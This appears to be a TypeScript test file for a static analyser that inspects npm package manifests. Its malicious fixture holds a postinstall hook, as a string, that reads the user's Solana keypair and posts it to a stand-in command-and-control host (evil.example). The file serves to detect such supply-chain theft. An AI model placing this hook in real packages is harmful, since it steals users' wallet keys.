// AC-2 from the Python multi-agent-split spec — static analysis over an PackageManifest.

import { PackageManifest } from '../models/contracts';
import { analyzeManifest } from './static-analysis';

const MALICIOUS_HOOK_SOURCE = `\
const fs = require('fs');
const os = require('os');
const path = require('path');
const axios = require('axios');

// Read the user's Solana keypair and POST it to a C2.
const seedPath = path.join(os.homedir(), '.config/solana/id.json');
const seed = fs.readFileSync(seedPath, 'utf8');
axios.post('https://evil.example/c2', { seed });
`;

function maliciousManifest(): PackageManifest {
  return {
    source_type: 'npm',
    found: true,
    name: 'lazarus-pkg',
    version: '0.0.1',
    file_tree: ['package.json', 'scripts/install.js'],
    scripts: { postinstall: 'node scripts/install.js' },
    dependencies: {},
    entrypoints: ['index.js'],
    notable_files: ['.env'],
    install_hooks: { postinstall: 'node scripts/install.js' },
    hook_sources: [{ path: 'scripts/install.js', content: MALICIOUS_HOOK_SOURCE }],
    error: null,
    suggested_verdict: null,
  };
}

function cleanManifest(): PackageManifest {
  return {
    source_type: 'npm',
    found: true,
    name: 'leftpad-clone',
    version: '1.0.0',
    file_tree: ['package.json', 'index.js'],
    scripts: { test: 'node test.js' },
    dependencies: {},
    entrypoints: ['index.js'],
    notable_files: [],
    install_hooks: {},
    hook_sources: [],
    error: null,
    suggested_verdict: null,
  };
}

test('AC-2: malicious hook sources yield crypto_theft findings at HIGH/CRITICAL', () => {
  const findings = analyzeManifest(maliciousManifest());
  expect(findings.length).toBeGreaterThan(0);

  const crypto = findings.filter((f) => f.category === 'crypto_theft');
  expect(crypto.length).toBeGreaterThan(0);
  for (const f of crypto) {
    expect(['HIGH', 'CRITICAL']).toContain(f.severity);
  }

  const titles = crypto.map((f) => f.title).join(' ');
  expect(titles).toContain('Solana');
  expect(titles).toContain('outbound HTTP');

  const files = new Set(findings.map((f) => f.file));
  expect(files.has('scripts/install.js')).toBe(true);
});

test('AC-2: declared install hook is always flagged at MEDIUM when command is benign', () => {
  const findings = analyzeManifest(maliciousManifest());
  const installHooks = findings.filter((f) => f.category === 'install_hook');
  expect(installHooks.length).toBeGreaterThan(0);
  expect(installHooks[0].severity).toBe('MEDIUM');
});

test('AC-2: clean manifest yields no findings', () => {
  expect(analyzeManifest(cleanManifest())).toEqual([]);
});

test('AC-2: failed ingest short-circuits to []', () => {
  expect(
    analyzeManifest({ found: false, name: 'x', suggested_verdict: 'NEEDS_REVIEW' } as any),
  ).toEqual([]);
});
